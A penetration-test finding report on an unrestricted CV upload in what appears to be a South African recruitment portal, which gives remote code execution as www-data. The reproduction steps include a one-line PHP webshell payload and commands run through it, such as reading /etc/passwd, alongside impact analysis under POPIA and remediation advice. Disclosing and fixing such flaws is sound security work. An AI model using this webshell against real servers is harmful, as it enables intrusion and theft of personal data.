[← Back to overview](../README.md)

# Finding 1: Unrestricted File Upload - Remote Code Execution and Unauthenticated CV Access

**Severity:** High &nbsp;|&nbsp; **CVSS v3.1:** 8.8 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
**CWE:** CWE-434 - Unrestricted Upload of File with Dangerous Type
**OWASP Top 10 (2021):** A03:2021 Injection · A05:2021 Security Misconfiguration
**Proof captured:** Yes (marker value redacted)

## Description

The CV upload section accepts any file with no validation of extension,
Content-Type, or content. Uploaded files are stored inside the **cv-view/** directory,
which sits in the Apache web root with PHP execution enabled, and the profile API returns
the file's UUID name. A registered user can upload a PHP webshell, read its path from the
profile endpoint, and run operating-system commands as **www-data** with a single request.
The same directory is served without authentication, so any uploaded file can be downloaded
by anyone who knows the UUID.

## Reproduction Steps

1. Register an account and log in.
2. Intercept a CV upload in Burp Suite - **POST /api/v1/profile/cv**, form field **cv**.
3. Set the filename to **shell.php**, the Content-Type to **application/x-php**, and the body to:

   ```php
   <?php echo system($_GET["cmd"]); ?>
   ```

4. Forward the request. The server returns **201 Created**.

   ![Baseline CV upload accepted](../evidence/Finding-01-RCE/SS-F01-02_pdf-uploaded-profile.png)
   *__Figure 1.1__ - Baseline CV upload accepted.*

   ![Server returns 201 Created on upload](../evidence/Finding-01-RCE/SS-F01-03_pdf-upload-201.png)
   *__Figure 1.2__ - Server returns 201 Created on upload.*

5. Fetch your profile **GET /api/v1/profile/** and note the **cv.filename** value.

   ![Profile API returns the stored file UUID](../evidence/Finding-01-RCE/SS-F01-04_profile-uuid-response.png)
   *__Figure 1.3__ - Profile API returns the stored file UUID.*

6. Browse to **/cv-view/<cv_filename>?cmd=id**. The response shows **uid=33(www-data)**, confirming RCE.

   ![Uploaded file reachable at /cv-view/ with no auth](../evidence/Finding-01-RCE/SS-F01-05_cvview-pdf-accessible.png)
   *__Figure 1.4__ - Uploaded file reachable at /cv-view/ with no auth.*

   ![shell.php upload accepted with 201](../evidence/Finding-01-RCE/SS-F01-10_shell-php-confirmed.png)
   *__Figure 1.5__ - Shell.php upload accepted with 201.*

   ![id returns uid=33(www-data), confirming RCE](../evidence/Finding-01-RCE/SS-F01-12_rce-uid-www-data.png)
   *__Figure 1.6__ - Id returns uid=33(www-data), confirming RCE.*

7. Read protected server-side files, e.g. `cat /etc/passwd`, the application source, or environment secrets.

   ![Directory listing via the webshell](../evidence/Finding-01-RCE/SS-F01-14_rce-cvview-ls-la.png)
   *__Figure 1.7__ - Directory listing via the webshell.*

   ![/etc/passwd read through the webshell](../evidence/Finding-01-RCE/SS-F01-15_rce-etc-passwd.png)
   *__Figure 1.8__ - /etc/passwd read through the webshell.*

   ![Listing of /var/www via the webshell](../evidence/Finding-01-RCE/SS-F01-16_rce-var-www-ls.png)
   *__Figure 1.9__ - Listing of /var/www via the webshell.*

## Business Impact

This is full server compromise from a self-registered account. The
attacker runs commands as **www-data** and can read database credentials, every candidate's
CV, the application source, and environment secrets, then pivot further into the hosting
environment. No privilege escalation is needed, which makes this the most damaging issue in
the report. Code execution also lets the attacker change or delete data, tamper with other
users' records, deface the portal, or take the site offline - so the damage spans integrity
and availability as well as data theft. The CVs and personal records exposed here are
personal information under POPIA, and serving them with no authentication is a direct failure
of the security safeguards Section 19 of the Act requires. South African CVs usually carry an
identity number along with contact and work history, so the exposed data likely includes
especially sensitive details, triggering the Section 22 duty to notify the Information
Regulator and affected data subjects.

## Remediation

Validate uploads by file content, not the client-supplied filename or
Content-Type. For PDFs, verify the **%PDF** magic bytes. Discard the original filename and
store a server-generated UUID. Most importantly, store uploads **outside the web root** and
serve them through an authenticated download handler that rejects unauthenticated requests.

---

[← Back to overview](../README.md) &nbsp;|&nbsp; [Next: Finding 2 - SQL Injection →](02-sql-injection.md)
